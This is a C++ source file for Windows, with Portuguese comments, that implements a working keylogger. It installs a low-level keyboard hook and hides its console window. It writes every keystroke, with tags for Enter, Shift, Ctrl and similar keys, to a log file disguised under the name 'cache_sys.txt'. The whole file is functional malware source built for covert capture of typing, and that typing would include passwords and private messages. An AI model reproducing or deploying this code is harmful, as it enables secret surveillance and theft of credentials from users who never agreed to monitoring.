#include <iostream>
#include <Windows.h>
#include <bits/stdc++.h>
#define FILE_LOGS "cache_sys.txt"

int special_keys[] = {VK_SPACE, VK_RETURN, 162, VK_BACK, VK_TAB, VK_MENU, VK_CAPITAL, 160};


void SaveData(std::string data){
    std::fstream log_file;

    // Abrir o arquivo
    // std::ios::app fará o novo acréscimo ao arquivo em vez de apagar o conteúdo do arquivo
    // E depois escreve nele
    log_file.open(FILE_LOGS, std::ios::app);

    // Grava dados no arquivo de log
    log_file << data;

    // Fecha o fluxo do arquivo
    log_file.close();
}


std::string SpecialKeys(int key){
    std::string resultado;

    switch(key){
    case VK_SPACE:
        // Tecla de espaço
        resultado = " ";
        break;
    case VK_RETURN:
        // Tecla de nova linha
        resultado = "[ENTER]\n";
        break;
    case VK_CAPITAL:
        // Tecla CAPSLOCK
        resultado = "[CAPS_LOCK]";
        break;
    case 160:
        // Tecla Shift
        resultado = "[SHIFT]";
        break;
    case VK_TAB:
        // Tecla TAB
        resultado = "[TAB]";
		break;
    case 162:
        // Tecla Control
        resultado = "[CTRL]";
        break;
    case VK_MENU:
        // Tecla ALT
        resultado = "[ALT]";
        break;
    default:
        break;
    }

    return resultado;
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            int ascii = kbStruct->vkCode;
            bool capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            bool isSpecialKey = std::find(std::begin(special_keys), std::end(special_keys), ascii) != std::end(special_keys);

			if(isSpecialKey){
				SaveData(SpecialKeys(ascii));
			}else{
				// NUMLOCK
				// 96 ... 105 = a ... j
				// 96-48 ... 105-48 = 0 ... 9
				if (ascii >= 96 && ascii <= 105){
					ascii -= 48;
				}
				
				// ascii 65 ... 90 =  A ... Z
				// ascii 65+32 ... 90+32 = a ... z
	            if ((ascii >= 65 && ascii <= 90) && !capital){
	            	ascii += 32; // muda o ascii para o de letra minuscula
				}
	            SaveData(std::string(1, (char)ascii));
	    	}
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
	// Fecha a janela do terminal
	FreeConsole();
	
    // Instala o gancho de teclado
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);

    // Mantém o programa em execução
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Remove o gancho de teclado antes de encerrar o programa
    UnhookWindowsHookEx(hook);

    return 0;
}